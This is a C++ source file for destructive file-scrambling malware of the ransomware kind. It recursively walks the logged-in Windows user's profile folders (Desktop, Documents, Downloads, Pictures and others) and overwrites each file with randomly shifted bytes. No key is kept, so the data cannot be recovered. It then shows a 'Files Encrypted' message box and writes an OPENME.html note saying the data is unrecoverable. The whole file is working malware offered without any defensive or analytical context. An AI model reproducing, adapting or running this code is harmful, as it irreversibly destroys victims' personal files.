#include "encrypt.h"
#pragma warning(disable : 4996)

/*
This is just for files in folder
You cant use like *.* ect
*/
VOID FileCryptor(std::string PathF) {
	std::fstream File, TempFile; 
	std::string PathTempF = "none.txt";


	File.open(PathF, std::ios::in); 
	TempFile.open(PathTempF, std::ios::out);

	char Byte;
	while (File >> std::noskipws >> Byte) {
		Byte += rand() % 500; //encryption part
		TempFile << Byte;
	}
	File.close();
	TempFile.close(); // free up space in memory

	File.open(PathF, std::ios::out);
	TempFile.open(PathTempF, std::ios::in);

	while (TempFile >> std::noskipws >> Byte) {
		File << Byte;
	}

	File.close();
	TempFile.close(); 

	remove(PathTempF.c_str()); // removes the temp file
}

//Better this
VOID DirectoryCryptor(std::string DirPath) {
	DIR* Dir;
	struct dirent* Entry;
	struct stat stats;

	std::string Path;

	if ((Dir = opendir(DirPath.c_str())) != NULL)
	{
		while ((Entry = readdir(Dir)) != NULL) 
		{
			if (strcmp(Entry->d_name, ".") != 0 && strcmp(Entry->d_name, "..") != 0) 
			{
				Path = DirPath + "\\" + Entry->d_name;
				stat(Path.c_str(), &stats);
				if (S_ISDIR(stats.st_mode)) {
					DirectoryCryptor(Path);
				}
				else {
					FileCryptor(Path);
				}
			}
		}
	}
}

/*
Instead of using C:\Users\Name
it uses %USERPROFILE% to encrypt the current logged user
*/
VOID Encryption(VOID) {
	char* USERPROFILE = getenv("USERPROFILE");

	OSVERSIONINFOEX Check; 
	ZeroMemory(&Check, sizeof(OSVERSIONINFOEX));
	Check.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((LPOSVERSIONINFO)&Check);

	/*
	NT Discriminator NT = 5 is xp NT = 6 or 10 is Vista or up
	*/

	//IF XP
	if (Check.dwMajorVersion == 5)
	{
		/*
		This crypt all %USERPROFILE% files
		*/
		DirectoryCryptor(std::string(USERPROFILE) + "\\");
		DirectoryCryptor(std::string(USERPROFILE) + "\\Desktop");
		DirectoryCryptor(std::string(USERPROFILE) + "\\My Documents");
		DirectoryCryptor(std::string(USERPROFILE) + "\\Favourites");
		DirectoryCryptor(std::string(USERPROFILE) + "\\Cookies");
		MessageBoxW(0, L"User Data Encrypted. See the HTML File for more informations. Your OS is XP", L"Files Encrypted", MB_ICONWARNING | MB_OK | MB_SYSTEMMODAL);
	}
	//IF VISTA to WIN11
	else if (Check.dwMajorVersion == 6, 10) {
		DirectoryCryptor(std::string(USERPROFILE) + "\\Desktop");
		DirectoryCryptor(std::string(USERPROFILE) + "\\Documents");
		DirectoryCryptor(std::string(USERPROFILE) + "\\Downloads");
		DirectoryCryptor(std::string(USERPROFILE) + "\\Music");
		DirectoryCryptor(std::string(USERPROFILE) + "\\Pictures");
		DirectoryCryptor(std::string(USERPROFILE) + "\\Videos");
		DirectoryCryptor(std::string(USERPROFILE) + "\\Contacts");
		DirectoryCryptor(std::string(USERPROFILE) + "\\Links");
		DirectoryCryptor(std::string(USERPROFILE) + "\\Favourites");
		MessageBoxW(0, L"User Data Encrypted. See the HTML File for more informations", L"Files Encrypted", MB_ICONWARNING | MB_OK | MB_SYSTEMMODAL);
	}
}
	
/*
This will create an html file
*/

VOID HTMLFile(VOID) {
	std::ofstream HTML("OPENME.html");
	HTML << "<html><body><center><style>html{background-color:beige;}</style><h1>WARNING</h1> <h3 style="">All your data was been encrypted in an unrecoverable way!</h3>   <h3 style="">We dont offer a decryption service and you cant decrypt your files!</h3><h3 style="">Dont waste your time all your data is unrecoverable</h3><h3 style="">Check if you have a USB Drive instead</h3></center></body></html>";
	HTML.close();
}
